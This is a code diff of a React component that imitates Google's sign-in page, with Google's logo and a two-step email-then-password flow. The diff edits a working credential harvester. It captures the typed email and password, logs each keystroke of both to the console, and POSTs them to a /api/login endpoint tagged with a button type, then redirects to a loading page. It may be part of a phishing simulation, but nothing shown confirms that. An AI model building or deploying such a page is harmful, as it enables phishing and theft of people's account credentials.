@@ -1,9 +1,7 @@
-
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import styled from 'styled-components';
 import { motion } from 'framer-motion';
 import { useNavigate, useLocation } from 'react-router-dom';
-
 
 const FakeGoogleLoginContainer = styled(motion.div)`
   display: flex;
@@ -39,6 +37,7 @@ const Input = styled.input`
   border: 1px solid #ccc;
   border-radius: 5px;
   font-size: 1rem;
+  box-sizing: border-box;
 `;
 
 const ButtonContainer = styled.div`
@@ -54,57 +53,108 @@ const Button = styled.button`
   border-radius: 5px;
   font-size: 1rem;
   cursor: pointer;
+
+  &:hover {
+    background: #1557b0;
+  }
 `;
-
-
 
 const FakeGoogleLogin = () => {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [step, setStep] = useState('email');
+  const [buttonType, setButtonType] = useState('unknown');
   const navigate = useNavigate();
   const location = useLocation();
-  const queryParams = new URLSearchParams(location.search);
-  const button = queryParams.get('button') || 'unknown';
 
-  const handleNext = async (currentEmail, currentPassword, currentStep) => {
-    if (currentStep === 'email') {
-      if (!currentEmail) {
+  // location.state에서 button 타입을 가져오기
+  useEffect(() => {
+    if (location.state && location.state.button) {
+      setButtonType(location.state.button);
+      console.log('Button type from state:', location.state.button);
+    }
+  }, [location.state]);
+
+  const handleEmailChange = (e) => {
+    const value = e.target.value;
+    console.log('Email changed:', value);
+    setEmail(value);
+  };
+
+  const handlePasswordChange = (e) => {
+    const value = e.target.value;
+    console.log('Password changed:', value);
+    setPassword(value);
+  };
+
+  const handleNext = async () => {
+    console.log('Button clicked - Current step:', step);
+    console.log('Current email:', email);
+    console.log('Current password:', password);
+
+    if (step === 'email') {
+      if (!email.trim()) {
         alert('Please enter your email');
         return;
       }
+      console.log('Moving to password step with email:', email);
       setStep('password');
     } else {
-      if (!currentPassword) {
+      if (!password.trim()) {
         alert('Please enter your password');
         return;
       }
-      // Send email and password when the form is submitted
-      console.log(`Button: ${button}, Email: ${currentEmail}, Password: ${currentPassword}`);
+
+      console.log('=== Submitting Login ===');
+      console.log('Email:', email);
+      console.log('Password:', password);
+      console.log('Button Type:', buttonType);
+
       try {
+        const payload = {
+          email: email,
+          password: password,
+          button: `google-${buttonType}`
+        };
+
+        console.log('Sending payload:', JSON.stringify(payload));
+
         const response = await fetch('/api/login', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
-          body: JSON.stringify({ email: currentEmail, password: currentPassword, button: `google-${button}` }),
+          body: JSON.stringify(payload),
         });
+
+        if (!response.ok) {
+          throw new Error(`HTTP error! status: ${response.status}`);
+        }
+
         const data = await response.json();
         console.log('Server response:', data);
       } catch (error) {
         console.error('Error sending login data:', error);
+        alert('An error occurred. Please try again.');
+        return;
       }
+
       navigate('/loading');
     }
   };
 
   return (
     <FakeGoogleLoginContainer
-        initial={{ opacity: 0 }}
-        animate={{ opacity: 1 }}
+      initial={{ opacity: 0 }}
+      animate={{ opacity: 1 }}
+      transition={{ duration: 0.5 }}
     >
       <FakeGoogleLoginForm>
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" />
+        <img
+          src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
+          alt="Google"
+          style={{ marginBottom: '20px' }}
+        />
         {step === 'email' ? (
           <>
             <Title>Sign in</Title>
@@ -113,10 +163,11 @@ const FakeGoogleLogin = () => {
               type="email"
               placeholder="Email or phone"
               value={email}
-              onChange={(e) => setEmail(e.target.value)}
+              onChange={handleEmailChange}
+              autoFocus
             />
             <ButtonContainer>
-              <Button onClick={() => handleNext(email, password, step)}>Next</Button>
+              <Button onClick={handleNext}>Next</Button>
             </ButtonContainer>
           </>
         ) : (
@@ -127,10 +178,11 @@ const FakeGoogleLogin = () => {
               type="password"
               placeholder="Enter your password"
               value={password}
-              onChange={(e) => setPassword(e.target.value)}
+              onChange={handlePasswordChange}
+              autoFocus
             />
             <ButtonContainer>
-              <Button onClick={() => handleNext(email, password, step)}>Next</Button>
+              <Button onClick={handleNext}>Next</Button>
             </ButtonContainer>
           </>
         )}
